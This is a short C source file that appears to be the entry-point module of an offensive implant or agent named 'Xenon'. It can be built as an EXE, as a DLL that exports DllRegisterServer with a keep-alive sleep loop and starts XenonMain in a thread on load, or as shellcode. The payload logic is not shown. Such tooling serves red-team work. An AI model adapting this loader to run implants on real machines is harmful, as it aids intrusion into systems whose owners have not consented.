#include "Xenon.h"
#include "Config.h"

/* EXE */
#ifdef _EXE

int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR szArgs, _In_ int nCmdShow)
{
    XenonMain();

    return 0;
}

#else

/* Export a function for DLL execution */
#ifndef _SHELLCODE

#ifndef DLL_EXPORT_FUNC

#define DLL_EXPORT_FUNC DllRegisterServer

#endif

__declspec(dllexport) 
VOID APIENTRY DLL_EXPORT_FUNC(VOID)
{
    /* Long sleeping loop to keep the process running */
    while ( TRUE )
    {
        Sleep(24 * 60 * 60 * 1000);
    }
}

#endif


__declspec(dllexport)
BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved)
{
    HANDLE hThread = NULL;
    
    switch (reason) {
        case DLL_PROCESS_ATTACH:
        {

        /* SHELLCODE */
        #ifdef _SHELLCODE

            XenonMain();
        
        /* DLL */
        #else

            /* Console for debugging DLL */
            #if !defined(_SHELLCODE) && defined(_DEBUG)
            
                AllocConsole();
                freopen( "CONOUT$", "w", stdout );
            
            #endif
            
            hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)XenonMain, NULL, 0, NULL);

        #endif

            return TRUE;
        }
    }
}
#endif